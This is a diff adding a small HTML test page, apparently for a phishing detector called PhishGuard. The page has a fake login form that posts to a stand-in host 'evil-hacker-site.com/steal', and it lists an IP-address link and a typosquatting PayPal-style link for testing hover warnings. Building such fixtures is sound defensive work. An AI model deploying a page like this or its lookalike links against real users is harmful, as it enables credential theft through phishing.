@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fake Login Page</title>
+    <style>
+        body { font-family: Arial; padding: 50px; background: #f0f2f5; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; width: 300px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 10px; margin: 10px 0; }
+        button { background: blue; color: white; padding: 10px; width: 100%; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Login to your account</h2>
+        <form action="http://evil-hacker-site.com/steal" method="POST">
+            <input type="text" placeholder="Username">
+            <!-- This password field on a non-HTTPS page will trigger PhishGuard -->
+            <input type="password" placeholder="Password">
+            <button type="submit">Log In</button>
+        </form>
+
+        <hr style="margin-top: 30px; border: 1px solid #ddd;">
+        
+        <h3 style="margin-top: 20px; font-size: 16px;">Test Hover Protection:</h3>
+        <p style="font-size: 13px; color: #666;">Hover your mouse over the links below.</p>
+        <ul style="font-size: 14px; text-align: left;">
+            <li style="margin-bottom: 10px;"><a href="http://192.168.1.100/login">Track Package (IP Address Link)</a></li>
+            <li style="margin-bottom: 10px;"><a href="http://paypal-secure-update-login-now.com">PayPal Update (Typosquatting Link)</a></li>
+            <li style="margin-bottom: 10px;"><a href="https://google.com">Safe Link (No warning will appear)</a></li>
+        </ul>
+    </div>
+</body>
+</html>
